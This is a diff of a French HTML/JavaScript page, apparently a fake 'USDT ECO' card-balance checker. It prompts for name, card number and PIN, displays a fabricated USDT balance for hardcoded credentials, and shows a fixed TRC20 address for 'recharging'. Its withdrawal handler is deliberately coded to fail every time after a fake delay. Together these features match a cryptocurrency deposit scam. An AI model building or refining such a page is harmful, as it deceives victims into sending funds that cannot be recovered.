@@ -3,9 +3,10 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Vérificateur de solde — Interface</title>
+<title>Vérificateur de solde — Interface Front-end Corrigée</title>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
 <style>
+/* ... (Votre CSS est inséré ici, inchangé) ... */
 :root{
   --bg:#f6f8ff; --card:#ffffff; --accent:#0b63ff; --muted:#5b6770; --danger:#b91c1c;
   font-family: Inter, "Segoe UI", Roboto, Arial, sans-serif;
@@ -299,6 +300,23 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
   margin-top: 10px;
   font-weight: 600;
 }
+
+
+/* Masquer les éléments de traduction Google */
+body > .skiptranslate,
+body > .skiptranslate.goog-te-spinner-pos,
+.goog-text-area,
+.goog-tooltip, .goog-tooltip:hover,
+.goog-text-highlight {
+  display: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
+  top: 0 !important;
+  padding-bottom: 0 !important; 
+  background: none !important;
+  box-shadow: none !important;
+}
+
 </style>
 </head>
 <body>
@@ -307,6 +325,7 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
   <div class="brand" aria-hidden="true">
     <div class="logo" title="SoldeCheck"><img style="width:100%;"  src="image/eco.png"></div>
     <div>
+
       <div style="font-weight:800"> USDT ECO</div>
       <div style="font-size:12px;color:var(--muted)">SoldeCheck</div>
     </div>
@@ -331,29 +350,30 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
   <aside class="aside" aria-hidden="true">
     <div class="logo" title="Logo">💳</div>
     <div class="brand">VERIFIEZ MON SOLDE</div>
-    
-    <div class="infoBox"></div>
+    <div class="infoBox">Bienvenu sur l'espace client </div>
   </aside>
 
   <div class="main">
     <div class="title">
       <h2 id="title">Vérifier le solde</h2>
-      
     </div>
 
     <form id="form" autocomplete="off" onsubmit="return false;">
       <div>
+        <label for="name">Nom complet</label>
+        <input id="name" type="text" placeholder="Nom Prénom" />
+        <div class="smalldesc"></div>
+      </div>
+      <div>
         <label for="card">Numéro de carte</label>
-        <input id="card" type="text" placeholder="1234 1234 1234 1234" maxlength="23" inputmode="numeric" />
+        <input id="card" type="text" placeholder="4536 9853 0985 3765" maxlength="23" inputmode="numeric" />
         <div class="smalldesc"></div>
       </div>
 
       <div>
         <label for="cvv">Code PIN</label>
         <input id="cvv" type="password" placeholder="123" maxlength="6" />
-        <div class="smalldesc">
-</div>
-     
+        <div class="smalldesc">Le PIN : 3 Chiffres </div>
  </div>
 
       <div class="actions">
@@ -362,11 +382,11 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
     </form>
 
     <div id="output" class="result" aria-live="polite">
-      <div style="font-size:13px;color:var(--muted)">Aucun test effectué — saisissez des valeurs et cliquez sur <strong>Afficher le solde</strong>.</div>
+      <div style="font-size:13px;color:var(--muted)">Affichez et gerez votre solde — saisissez des valeurs et cliquez sur <strong>Afficher le solde</strong>.</div>
     </div>
 
     <div class="muted">
-
+      Vérification simulée en JavaScript.
   </div>
 </div>
 
@@ -376,7 +396,7 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
         <h3 id="modalTitle">Vérification...</h3>
         <div id="modalContent" class="loading">
             <div class="spinner"></div>
-            <span>Vérification en cours</span>
+            <span>Vérification en cours...</span>
         </div>
         <div id="balanceModalActions" class="modal-actions" style="display:none;">
             <button id="showOpsBtn" class="btn"><i class="fa-solid fa-exchange-alt"></i>Faire une opération</button>
@@ -391,25 +411,28 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
         <div class="ops-container">
             <div>
                 <div class="section-title">Recharger la carte</div>
-  <label for="destName"><strong>USDT Adress(TRC20)</strong></label>
-                     
+                <label for="rechargeAddress"><strong>USDT Adress (TRC20)</strong></label>
+
                 <div class="recharge-info">
                     <div class="address-box">
                         <i class="fa-solid fa-qrcode"></i>
-                        TTQy4URazYFovwi7uNYoDpbZ3aFiphasdj               </div>
+                        TTQy4URazYFovwi7uNYoDpbZ3aFiphasdj               
+                    </div>
                 </div>
             </div>
-            
+
             <div>
                 <div class="section-title">Faire un retrait</div>
                 <form id="withdrawForm" class="withdraw-form" onsubmit="return false;">
                     <div class="form-group">
-                         <input id="destName" type="text" placeholder="Nom complet" required />
+                        <label for="destName">Nom complet du bénéficiaire</label>
+                        <input id="destName" type="text" placeholder="Nom complet" required />
                     </div>
                     <div class="form-group">
-                        <label for="destAddress">  <input id="destAddress" type="text" placeholder="Adresse USDT" required />
+                        <label for="destAddress">Adresse USDT (TRC20) du bénéficiaire</label>
+                        <input id="destAddress" type="text" placeholder="Adresse USDT" required />
                     </div>
-                    <button type="submit"><i class="fa-solid fa-paper-plane"></i>Effectuer le retrait</button>
+                    <button id="withdrawBtn" type="submit"><i class="fa-solid fa-paper-plane"></i>Effectuer le retrait</button>
                     <div id="withdrawMessage" class="error-message" style="display:none;"></div>
                 </form>
             </div>
@@ -417,101 +440,269 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
     </div>
 </div>
 
+<div id="resultModalBg" class="modal-bg" style="display: none;">
+    <div class="modal result-modal">
+        <h3 id="resultModalTitle" style="color: var(--danger);"><i class="fa-solid fa-circle-exclamation"></i> Échec de l'Opération</h3>
+        <p id="resultModalMessage" style="font-weight: 500; text-align: center; color: var(--muted);"></p>
+        <button id="closeResultModal" class="btn" style="background-color: var(--danger); width: 100%; margin-top: 15px;">Fermer</button>
+    </div>
+</div>
+
+
 <script>
-(function(){
-  const checkBtn = document.getElementById('checkBtn');
-  const cvvInput = document.getElementById('cvv');
-  const cardInput = document.getElementById('card');
-  const output = document.getElementById('output');
-  const modalBg = document.getElementById('modalBg');
-  const modalTitle = document.getElementById('modalTitle');
-  const modalContent = document.getElementById('modalContent');
-  const closeModal = document.getElementById('closeModal');
-  const showOpsBtn = document.getElementById('showOpsBtn');
+document.addEventListener('DOMContentLoaded', () => {
+    // --- Éléments du formulaire principal ---
+    const nameInput = document.getElementById('name');
+    const cardInput = document.getElementById('card');
+    const pinInput = document.getElementById('cvv'); 
+    const checkBtn = document.getElementById('checkBtn');
+    const outputDiv = document.getElementById('output');
 
-  const opsModalBg = document.getElementById('opsModalBg');
-  const closeOpsModal = document.getElementById('closeOpsModal');
-  const withdrawForm = document.getElementById('withdrawForm');
-  const withdrawMessage = document.getElementById('withdrawMessage');
+    // --- Éléments du premier Modal (Balance) ---
+    const modalBg = document.getElementById('modalBg');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalContent = document.getElementById('modalContent');
+    const balanceModalActions = document.getElementById('balanceModalActions');
+    const closeModalBtn = document.getElementById('closeModal');
+    const showOpsBtn = document.getElementById('showOpsBtn');
 
-  function digits(s){ return (s||"").replace(/[^0-9]/g,''); }
+    // --- Éléments du second Modal (Opérations) ---
+    const opsModalBg = document.getElementById('opsModalBg');
+    const closeOpsModalBtn = document.getElementById('closeOpsModal');
+    const withdrawForm = document.getElementById('withdrawForm');
+    const withdrawMessage = document.getElementById('withdrawMessage');
+    const destAddressInput = document.getElementById('destAddress'); 
 
-  function showError(msg){
-    output.innerHTML = '<div class="bad">'+msg+'</div>';
-  }
+    // --- Éléments du Modal de Résultat (Succès/Échec) ---
+    const resultModalBg = document.getElementById('resultModalBg');
+    const resultModalTitle = document.getElementById('resultModalTitle');
+    const resultModalMessage = document.getElementById('resultModalMessage');
+    const closeResultModalBtn = document.getElementById('closeResultModal');
 
-  checkBtn.addEventListener('click', ()=>{
-    const cardDigits = digits(cardInput.value || '');
-    const cvv = (cvvInput.value || '').trim();
+    // --- Données simulées (Hardcodées) ---
+    // J'ai rendu le nom plus tolérant à la casse dans la vérification ci-dessous.
+    const SIMULATED_DATA = {
+        name: 'Pablo Canavidez', // Nom pour affichage
+        card: '5678901234567890', // Carte sans espaces, utilisée pour la comparaison
+        pin: '396', 
+        balance: '520.00', 
+        iban: 'FR76 5072 **** **** 0100 '
+    };
 
-    if(cardDigits !== '5678901234567890' || cvv !== '396'){
-      showError('Information incorrecte');
-      return;
+    // --- Fonctions utilitaires ---
+
+    // Formatage de la carte: Ajoute des espaces tous les 4 chiffres
+    const formatCardNumber = (value) => {
+        const cleanValue = value.replace(/\D/g, '');
+        const formattedValue = cleanValue.match(/.{1,4}/g);
+        return formattedValue ? formattedValue.join(' ') : '';
+    };
+
+    // Nettoyage de la carte: N'enlève que les espaces
+    const cleanCardNumber = (value) => value.replace(/\s/g, '');
+
+
+    // Affichage d'un message dans la DIV de résultat principale
+    const displayOutput = (isGood, message) => {
+        outputDiv.innerHTML = `<div class="${isGood ? 'good' : 'bad'}">${message}</div>`;
+        if (!isGood) {
+            outputDiv.innerHTML += `<div class="muted">Veuillez vérifier les informations et réessayer.</div>`;
+        }
+    };
+
+    // Ouvre le modal principal et commence l'animation de chargement
+    const openBalanceModal = () => {
+        modalTitle.textContent = 'Vérification...';
+        modalContent.innerHTML = `<div class="spinner"></div><span>Vérification en cours...</span>`;
+        modalContent.className = 'loading';
+        balanceModalActions.style.display = 'none';
+        modalBg.style.display = 'flex';
+    };
+
+    // Ferme le modal principal
+    const closeBalanceModal = () => {
+        modalBg.style.display = 'none';
+    };
+
+    // Ferme le modal d'opérations
+    const closeOpsModal = () => {
+        opsModalBg.style.display = 'none';
+    };
+
+    // Ouvre le modal de résultat
+    const openResultModal = (isSuccess, title, message) => {
+        const icon = isSuccess ? 'fa-circle-check' : 'fa-circle-exclamation';
+        const color = isSuccess ? '#065f46' : 'var(--danger)';
+        const btnColor = isSuccess ? 'var(--accent)' : 'var(--danger)';
+
+        resultModalTitle.innerHTML = `<i class="fa-solid ${icon}"></i> ${title}`;
+        resultModalTitle.style.color = color;
+        resultModalMessage.textContent = message;
+        closeResultModalBtn.style.backgroundColor = btnColor;
+        resultModalBg.style.display = 'flex';
+    };
+
+    // Ferme le modal de résultat
+    const closeResultModal = () => {
+        resultModalBg.style.display = 'none';
+    };
+
+
+    // Simule la vérification du solde
+    const checkBalance = () => {
+        const name = nameInput.value.trim();
+        const card = cleanCardNumber(cardInput.value);
+        const pin = pinInput.value.trim();
+
+        // 1. Validation de base
+        // Vérification de la longueur minimale pour la démo.
+        if (!name || card.length < 16 || pin.length < 3) { 
+            displayOutput(false, 'Veuillez remplir tous les champs correctement (Nom, Carte à 16 chiffres, PIN à 3 chiffres).');
+            return;
+        }
+
+        // 2. Afficher l'animation de chargement du modal
+        openBalanceModal();
+
+        // 3. Simuler le délai du serveur (1.5 seconde)
+        setTimeout(() => {
+            // 4. Logique de vérification simulée (CORRIGÉE : utilisation de toUpperCase() pour le nom)
+            const isMatch = (
+                // Nom non sensible à la casse
+                name.toUpperCase() === SIMULATED_DATA.name.toUpperCase() && 
+                card === SIMULATED_DATA.card &&
+                pin === SIMULATED_DATA.pin
+            );
+
+            if (isMatch) {
+                // Succès : Afficher le solde
+                modalTitle.textContent = 'Solde Vérifié';
+                const content = `
+                    <div class="balance-display">
+                        <div class="client-name">${SIMULATED_DATA.name}</div>
+                        <div class="balance-card">
+                            <div class="balance-label">Solde Disponible</div>
+                            <div class="balance-amount">
+                                ${SIMULATED_DATA.balance}
+                                <span class="currency">USDT</span>
+                            </div>
+                        </div>
+                        <div class="bank-info">
+                            <div class="info-item"><i class="fa-solid fa-credit-card"></i>Carte : <span>${formatCardNumber(SIMULATED_DATA.card)}</span></div>
+                            <div class="info-item"><i class="fa-solid fa-building-columns"></i>IBAN : <span>${SIMULATED_DATA.iban}</span></div>
+                        </div>
+                    </div>
+                `;
+                modalContent.innerHTML = content;
+                modalContent.className = ''; // Supprimer la classe 'loading'
+                balanceModalActions.style.display = 'flex';
+                // Message de succès dans la DIV principale (peut être vide ou informatif)
+                displayOutput(true, '');
+            } else {
+                // Échec : Afficher le message d'erreur
+                closeBalanceModal();
+                const errorMessage = 'Nom, Numéro de carte, ou Code PIN incorrect. Veuillez réessayer.';
+                displayOutput(false, errorMessage);
+            }
+        }, 1500); // Délai de 1.5s
+    };
+
+    // --- Gestionnaires d'événements ---
+
+    // Événement sur le bouton de vérification
+    checkBtn.addEventListener('click', checkBalance);
+
+    // Événement pour formater la carte en temps réel
+    cardInput.addEventListener('input', (e) => {
+        const cursorStart = cardInput.selectionStart;
+        const previousLength = cardInput.value.length;
+
+        // Formater la valeur
+        const formattedValue = formatCardNumber(e.target.value);
+        cardInput.value = formattedValue;
+
+        // Maintenir la position du curseur
+        const newLength = cardInput.value.length;
+        const difference = newLength - previousLength;
+        cardInput.selectionStart = cursorStart + difference;
+        cardInput.selectionEnd = cursorStart + difference;
+    });
+
+    // Événements pour fermer les Modals
+    closeModalBtn.addEventListener('click', closeBalanceModal);
+    closeOpsModalBtn.addEventListener('click', closeOpsModal);
+    closeResultModalBtn.addEventListener('click', closeResultModal);
+    modalBg.addEventListener('click', (e) => {
+        if (e.target === modalBg) closeBalanceModal();
+    });
+    opsModalBg.addEventListener('click', (e) => {
+        if (e.target === opsModalBg) closeOpsModal();
+    });
+    resultModalBg.addEventListener('click', (e) => {
+        if (e.target === resultModalBg) closeResultModal();
+    });
+
+    // Événement pour ouvrir le Modal d'Opérations
+    showOpsBtn.addEventListener('click', () => {
+        closeBalanceModal();
+        opsModalBg.style.display = 'flex';
+        withdrawMessage.style.display = 'none'; // Réinitialiser le message de retrait
+    });
+
+    // Événement pour simuler le retrait (Échec systématique)
+    withdrawForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const destName = document.getElementById('destName').value.trim();
+        const destAddress = destAddressInput.value.trim();
+
+        if (!destName || !destAddress) {
+            withdrawMessage.textContent = "Veuillez remplir tous les champs pour le retrait.";
+            withdrawMessage.style.display = 'block';
+            return;
+        }
+
+        // --- LOGIQUE MODIFIÉE POUR ÉCHEC SYSTÉMATIQUE ---
+        const isAddressValid = false; // Forcer l'échec
+        const errorMessage = "Opération échouée : l'adresse USDT n'a pas été reconnue ou est invalide.";
+        // ----------------------------------------------------
+
+        // Cacher le formulaire et montrer le spinner
+        withdrawForm.style.pointerEvents = 'none';
+        withdrawMessage.style.display = 'block';
+        withdrawMessage.style.color = 'var(--accent)';
+        withdrawMessage.innerHTML = '<div class="spinner" style="display:inline-block; margin-right:8px;"></div> Retrait en cours de vérification...';
+
+        // Simuler le délai de la transaction (5 secondes)
+        setTimeout(() => {
+            // Réinitialiser le formulaire et les états
+            withdrawForm.style.pointerEvents = 'auto';
+            withdrawMessage.style.display = 'none'; 
+
+            closeOpsModal(); 
+
+            if (isAddressValid) {
+                // Ce bloc ne sera JAMAIS atteint
+                openResultModal(true, 'Opération Réussie', `Le retrait a été effectué avec succès.`);
+            } else {
+                // Échec systématique
+                openResultModal(false, 'Échec du Retrait', errorMessage);
+            }
+
+            withdrawForm.reset();
+            destAddressInput.value = ''; 
+
+        }, 5000); 
+    });
+
+    // Initialisation de la traduction Google
+    if(typeof googleTranslateElementInit === 'function') {
+        googleTranslateElementInit();
     }
-
-    // Efface erreur précédente
-    output.innerHTML = '';
-
-    // Affiche le pop-up avec chargement
-    modalBg.style.display = 'flex';
-    modalTitle.textContent = 'Vérification...';
-    modalContent.innerHTML = '<div class="loading"><div class="spinner"></div><span>Vérification en cours</span></div>';
-    document.getElementById('balanceModalActions').style.display = 'none';
-
-    // Simule un temps de vérification
-    setTimeout(() => {
-      modalTitle.textContent = 'Vérification terminée ✅';
-      modalContent.innerHTML = `
-        <div class="balance-display">
-            <span class="client-name">Jean Dupont</span>
-            <div class="balance-card">
-                <span class="balance-label">Solde disponible</span>
-                <div class="balance-amount">20 000 <span class="currency">USDT</span></div>
-            </div>
-            <div class="bank-info">
-                <div class="info-item">
-                    <i class="fa-solid fa-file-invoice"></i>
-                    IBAN: FR76 5767 1464 **** **** 5678 901
-                </div>
-                <div class="info-item">
-                    <i class="fa-solid fa-credit-card"></i>
-                    Carte: 5678 9012 3456 7890
-                </div>
-            </div>
-        </div>
-      `;
-      document.getElementById('balanceModalActions').style.display = 'flex';
-    }, 5000);
-  });
-
-  // Fermer le pop-up du solde
-  closeModal.addEventListener('click', ()=>{
-    modalBg.style.display = 'none';
-  });
-
-  // Ouvrir le pop-up des opérations depuis le pop-up du solde
-  showOpsBtn.addEventListener('click', ()=>{
-    modalBg.style.display = 'none'; // Ferme le premier pop-up
-    opsModalBg.style.display = 'flex'; // Ouvre le second pop-up
-  });
-
-  // Fermer le pop-up des opérations
-  closeOpsModal.addEventListener('click', ()=>{
-    opsModalBg.style.display = 'none';
-    withdrawMessage.style.display = 'none';
-  });
-
-  // Gérer la soumission du formulaire de retrait
-  withdrawForm.addEventListener('submit', (e) => {
-    e.preventDefault();
-    withdrawMessage.textContent = 'Vous ne pouvez pas effectuer cette action.';
-    withdrawMessage.style.display = 'block';
-  });
-
-})();
+});
 </script>
 
     <script type="text/javascript">
+    // Fonction requise par Google Translate
     function googleTranslateElementInit() {
       new google.translate.TranslateElement({
         pageLanguage: 'fr',
@@ -522,4 +713,4 @@ footer{margin-top:8px;font-size:12px;color:var(--muted);text-align:center}
   </script>
   <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
-</html>
+  </html>
